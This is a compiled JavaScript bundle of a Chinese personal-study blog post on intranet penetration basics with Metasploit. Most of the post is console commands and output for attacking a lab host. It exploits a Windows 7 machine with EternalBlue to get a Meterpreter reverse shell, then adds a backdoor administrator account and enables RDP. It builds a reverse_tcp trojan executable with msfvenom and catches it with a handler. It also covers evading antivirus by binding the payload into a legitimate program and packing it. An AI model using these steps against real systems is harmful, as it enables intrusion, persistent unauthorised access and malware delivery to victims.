import{_ as n,c as a,a as e,o as i}from"./app-Dh5bFHR3.js";const l="/blog/assets/image-20220730145130575-Bm41KzLf.png",p="/blog/assets/image-20220730145854593-CRzzvtOy.png",t="/blog/assets/image-20220730145955949-CcGWSs3y.png",c="/blog/assets/image-20220730155715239-CmRHn7h-.png",r="/blog/assets/image-20220730155734710-C3Am_hca.png",d={};function o(m,s){return i(),a("div",null,s[0]||(s[0]=[e(`<h2 id="kali最强渗透工具-metesploit" tabindex="-1"><a class="header-anchor" href="#kali最强渗透工具-metesploit"><span>Kali最强渗透工具 Metesploit</span></a></h2><p>启动方法：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span></span>
<span class="line">└─<span class="token comment"># msfconsole </span></span>
<span class="line"><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span></span>
<span class="line"><span class="token comment"># msf6: MeteSploit 版本6</span></span>
<span class="line">msf6 <span class="token operator">&gt;</span> </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>msf使用法则：</p><p>​ 使用模块</p><p>​ 配置模块必选项</p><p>​ 运行模块</p><p>三步操作，就能实现对主流漏洞的攻击</p><h3 id="例-永恒之蓝攻击" tabindex="-1"><a class="header-anchor" href="#例-永恒之蓝攻击"><span>例：永恒之蓝攻击</span></a></h3><p>名词解释：</p><p>exploit 漏洞攻击脚本</p><p>payload 攻击载荷（起实际作用的东西）</p><p>例：发射火箭，payload为卫星体，expload为助推器</p><ol><li>搜索模块</li></ol><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 <span class="token operator">&gt;</span> search ms17_010</span>
<span class="line"></span>
<span class="line">Matching Modules</span>
<span class="line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span></span>
<span class="line"></span>
<span class="line">   <span class="token comment">#  Name                                      Disclosure Date  Rank     Check  Description                                                                          </span></span>
<span class="line">   -  ----                                      ---------------  ----     -----  -----------                                                                          </span>
<span class="line">   <span class="token number">0</span>  exploit/windows/smb/ms17_010_eternalblue  <span class="token number">2017</span>-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption                       </span>
<span class="line">   <span class="token number">1</span>  exploit/windows/smb/ms17_010_psexec       <span class="token number">2017</span>-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution                                                                                                                                                                   </span>
<span class="line">   <span class="token number">2</span>  auxiliary/admin/smb/ms17_010_command      <span class="token number">2017</span>-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution                                                                                                                                                                </span>
<span class="line">   <span class="token number">3</span>  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection                     </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>使用模块</li></ol><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 <span class="token operator">&gt;</span> use exploit/windows/smb/ms17_010_eternalblue</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>查看配置选项</li></ol><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span>
<span class="line"></span>
<span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span>
<span class="line"></span>
<span class="line">   Name           Current Setting  Required  Description</span>
<span class="line">   ----           ---------------  --------  -----------</span>
<span class="line">   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span>
<span class="line">   RPORT          445              yes       The target port (TCP)</span>
<span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedd</span>
<span class="line">                                             ed Standard 7 target machines.</span>
<span class="line">   SMBPass                         no        (Optional) The password for the specified username</span>
<span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span>
<span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S</span>
<span class="line">                                             tandard 7 target machines.</span>
<span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7</span>
<span class="line">                                             target machines.</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span>
<span class="line">   LHOST     192.168.220.136  yes       The listen address (an interface may be specified)</span>
<span class="line">   LPORT     4444             yes       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   0   Automatic Target</span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="4"><li>配置模块</li></ol><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.220.135</span>
<span class="line">RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.220.135</span>
<span class="line"><span class="token comment"># 以下为默认配置，如无需改变可不设置</span></span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp</span>
<span class="line">payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/x64/meterpreter/reverse_tcp</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="5"><li>检查配置</li></ol><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span>
<span class="line"></span>
<span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span>
<span class="line"></span>
<span class="line">   Name           Current Setting  Required  Description</span>
<span class="line">   ----           ---------------  --------  -----------</span>
<span class="line">   RHOSTS         192.168.220.135  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span>
<span class="line">   RPORT          445              yes       The target port (TCP)</span>
<span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedd</span>
<span class="line">                                             ed Standard 7 target machines.</span>
<span class="line">   SMBPass                         no        (Optional) The password for the specified username</span>
<span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span>
<span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S</span>
<span class="line">                                             tandard 7 target machines.</span>
<span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7</span>
<span class="line">                                             target machines.</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span>
<span class="line">   LHOST     192.168.220.136  yes       The listen address (an interface may be specified)</span>
<span class="line">   LPORT     4444             yes       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   0   Automatic Target</span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="6"><li>运行脚本</li></ol><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span>
<span class="line"></span>
<span class="line">[*] Started reverse TCP handler on 192.168.220.136:4444 </span>
<span class="line">[*] 192.168.220.135:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span>
<span class="line">[+] 192.168.220.135:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span>
<span class="line">[*] 192.168.220.135:445   - Scanned 1 of 1 hosts (100% complete)</span>
<span class="line">[+] 192.168.220.135:445 - The target is vulnerable.</span>
<span class="line">[*] 192.168.220.135:445 - Connecting to target for exploitation.</span>
<span class="line">[+] 192.168.220.135:445 - Connection established for exploitation.</span>
<span class="line">[+] 192.168.220.135:445 - Target OS selected valid for OS indicated by SMB reply</span>
<span class="line">[*] 192.168.220.135:445 - CORE raw buffer dump (42 bytes)</span>
<span class="line">[*] 192.168.220.135:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span>
<span class="line">[*] 192.168.220.135:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span>
<span class="line">[*] 192.168.220.135:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span>
<span class="line">[+] 192.168.220.135:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span>
<span class="line">[*] 192.168.220.135:445 - Trying exploit with 12 Groom Allocations.</span>
<span class="line">[*] 192.168.220.135:445 - Sending all but last fragment of exploit packet</span>
<span class="line">[*] 192.168.220.135:445 - Starting non-paged pool grooming</span>
<span class="line">[+] 192.168.220.135:445 - Sending SMBv2 buffers                                                                                                                       </span>
<span class="line">[+] 192.168.220.135:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.                                                                       </span>
<span class="line">[*] 192.168.220.135:445 - Sending final SMBv2 buffers.                                                                                                                </span>
<span class="line">[*] 192.168.220.135:445 - Sending last fragment of exploit packet!                                                                                                    </span>
<span class="line">[*] 192.168.220.135:445 - Receiving response from exploit packet                                                                                                      </span>
<span class="line">[+] 192.168.220.135:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!                                                                                  </span>
<span class="line">[*] 192.168.220.135:445 - Sending egg to corrupted connection.                                                                                                        </span>
<span class="line">[*] 192.168.220.135:445 - Triggering free of corrupted buffer.                                                                                                        </span>
<span class="line">[*] Sending stage (200262 bytes) to 192.168.220.135                                                                                                                   </span>
<span class="line">[*] Meterpreter session 1 opened (192.168.220.136:4444 -&gt; 192.168.220.135:49160 ) at 2022-07-29 08:00:52 -0400</span>
<span class="line">[+] 192.168.220.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>
<span class="line">[+] 192.168.220.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>
<span class="line">[+] 192.168.220.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>
<span class="line">meterpreter &gt;  </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="meterpreter" tabindex="-1"><a class="header-anchor" href="#meterpreter"><span>meterpreter</span></a></h4><p>meterpreter是强大的后渗透模块，可输入 help 查看帮助选项</p><p>可进行：远程控制、命令执行、摄像头监控、创建后门用户、破坏篡改系统等操作</p><h3 id="创建后门用户并开启远程连接" tabindex="-1"><a class="header-anchor" href="#创建后门用户并开启远程连接"><span>创建后门用户并开启远程连接：</span></a></h3><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line"><span class="token comment"># Get Shell</span></span>
<span class="line">meterpreter <span class="token operator">&gt;</span> shell</span>
<span class="line">Process <span class="token number">1276</span> created.</span>
<span class="line">Channel <span class="token number">1</span> created.</span>
<span class="line">Microsoft Windows <span class="token punctuation">[</span>�汾 <span class="token number">6.1</span>.7601<span class="token punctuation">]</span></span>
<span class="line">��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2009</span> Microsoft Corporation����������Ȩ����</span>
<span class="line"></span>
<span class="line"><span class="token comment"># 解决中文乱码问题</span></span>
<span class="line">C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>chcp <span class="token number">65001</span>		</span>
<span class="line">chcp <span class="token number">65001</span></span>
<span class="line">Active code page: <span class="token number">65001</span></span>
<span class="line"></span>
<span class="line"><span class="token comment"># 创建用户</span></span>
<span class="line">C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net user zhangsan <span class="token number">123456</span> /add 	</span>
<span class="line">net user zhangsan <span class="token number">123456</span> /add</span>
<span class="line">The <span class="token builtin class-name">command</span> completed successfully.</span>
<span class="line"></span>
<span class="line"><span class="token comment"># 将zhangsan添加到Administrators组</span></span>
<span class="line">C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net localgroup Administrators zhangsan /add	</span>
<span class="line">net localgroup Administrators zhangsan /add</span>
<span class="line">The <span class="token builtin class-name">command</span> completed successfully.</span>
<span class="line"></span>
<span class="line">C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>exit</span>
<span class="line"><span class="token builtin class-name">exit</span></span>
<span class="line"></span>
<span class="line"><span class="token comment"># 启用RDP</span></span>
<span class="line">meterpreter <span class="token operator">&gt;</span> run getgui <span class="token parameter variable">-e</span></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.</span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/windows/manage/enable_rdp <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows Remote Desktop Configuration Meterpreter Script by Darkoperator</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Carlos Perez carlos_perez@darkoperator.com</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Enabling Remote Desktop</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>     RDP is already enabled</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting Terminal Services <span class="token function">service</span> startup mode</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Terminal Services <span class="token function">service</span> is already <span class="token builtin class-name">set</span> to auto</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Opening port <span class="token keyword">in</span> <span class="token builtin class-name">local</span> firewall <span class="token keyword">if</span> necessary</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> For cleanup use command: run multi_console_command <span class="token parameter variable">-r</span> /home/kali/.msf4/logs/scripts/getgui/clean_up__20220730.3929.rc</span>
<span class="line"></span>
<span class="line"><span class="token comment"># 退出</span></span>
<span class="line">meterpreter <span class="token operator">&gt;</span> <span class="token builtin class-name">exit</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Shutting down Meterpreter<span class="token punctuation">..</span>.</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.220.135 - Meterpreter session <span class="token number">1</span> closed.  Reason: User <span class="token builtin class-name">exit</span></span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">exit</span></span>
<span class="line">                                                                                                                                                                      </span>
<span class="line">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span></span>
<span class="line">└─$ eterpreter <span class="token operator">&gt;</span> </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="使用msfvenom生成远控木马" tabindex="-1"><a class="header-anchor" href="#使用msfvenom生成远控木马"><span>使用msfvenom生成远控木马</span></a></h3><p>msfvenom是用来生成后门的软件，在目标机上执行后门，在本地监听上线。</p><p>*：msfvenom在shell中使用，不是在msfconsole终端</p><p><img src="`+l+`" alt="image-20220730145130575"></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">┌──(root㉿kali)-[~]</span>
<span class="line">└─# pwd</span>
<span class="line">/root</span>
<span class="line">                                                                                                                                                                      </span>
<span class="line">┌──(root㉿kali)-[~]</span>
<span class="line">└─# cd /home </span>
<span class="line">                                                                                                                                                                      </span>
<span class="line">┌──(root㉿kali)-[/home]</span>
<span class="line">└─# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.220.136 lport=10000 -f exe -o demo10000.exe</span>
<span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span>
<span class="line">[-] No arch selected, selecting arch: x64 from the payload</span>
<span class="line">No encoder specified, outputting raw payload</span>
<span class="line">Payload size: 510 bytes</span>
<span class="line">Final size of exe file: 7168 bytes</span>
<span class="line">Saved as: demo10000.exe</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此时，Home目录下已成功生成demo10000.exe</p><p><img src="`+p+'" alt="image-20220730145854593"></p><p>此时尝试直接将demo10000.exe复制到Windows，安全软件会自动拦截并处理</p><p><img src="'+t+`" alt="image-20220730145955949"></p><p>暂时先加入信任列表，并从隔离区恢复文件。</p><p>此时Kali中的10000端口还没启用，无法监听：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 <span class="token operator">&gt;</span> use exploit/multi/handler </span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 exploit(multi/handler) &gt; show options </span>
<span class="line"></span>
<span class="line">Module options (exploit/multi/handler):</span>
<span class="line"></span>
<span class="line">   Name  Current Setting  Required  Description</span>
<span class="line">   ----  ---------------  --------  -----------</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options (generic/shell_reverse_tcp):</span>
<span class="line"></span>
<span class="line">   Name   Current Setting  Required  Description</span>
<span class="line">   ----   ---------------  --------  -----------</span>
<span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span>
<span class="line">   LPORT  4444             yes       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   0   Wildcard Target</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>配置选项</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span>
<span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span>
<span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.220.136</span>
<span class="line">lhost =&gt; 192.168.220.136</span>
<span class="line">msf6 exploit(multi/handler) &gt; set lport 10000</span>
<span class="line">lport =&gt; 10000</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.220.136:10000 </span>
<span class="line"></span>
<span class="line"><span class="token comment"># 然后到被攻击的机器中打开demo10000.exe</span></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">200262</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.220.135</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.220.136:10000 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.220.135:49161 <span class="token punctuation">)</span> at <span class="token number">2022</span>-07-30 03:20:55 <span class="token parameter variable">-0400</span></span>
<span class="line"></span>
<span class="line"><span class="token comment"># 即可get shell</span></span>
<span class="line">meterpreter <span class="token operator">&gt;</span> </span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="免杀" tabindex="-1"><a class="header-anchor" href="#免杀"><span>免杀</span></a></h3><h4 id="捆绑-效果不强" tabindex="-1"><a class="header-anchor" href="#捆绑-效果不强"><span>捆绑（效果不强）</span></a></h4><p>将demo10000捆绑到 FileTags.exe中：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop<span class="token punctuation">]</span></span>
<span class="line">└─<span class="token comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.220.136 lport=10000 -x FileTags.exe -f exe -o demo10000.exe</span></span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: x64 from the payload</span>
<span class="line">No encoder specified, outputting raw payload</span>
<span class="line">Payload size: <span class="token number">510</span> bytes</span>
<span class="line">Final size of exe file: <span class="token number">2677248</span> bytes</span>
<span class="line">Saved as: demo10000.exe</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="加壳" tabindex="-1"><a class="header-anchor" href="#加壳"><span>加壳</span></a></h4><p><img src="`+c+'" alt="image-20220730155715239"></p><p><img src="'+r+'" alt="image-20220730155734710"></p>',53)]))}const b=n(d,[["render",o]]),u=JSON.parse('{"path":"/blogs/xxbj/Network_Security/1_Basic.html","title":"内网渗透基础","lang":"en-US","frontmatter":{"title":"内网渗透基础","date":"2022-07-30T00:00:00.000Z","tags":["网络安全"],"categories":["学习笔记"]},"headers":[{"level":2,"title":"Kali最强渗透工具 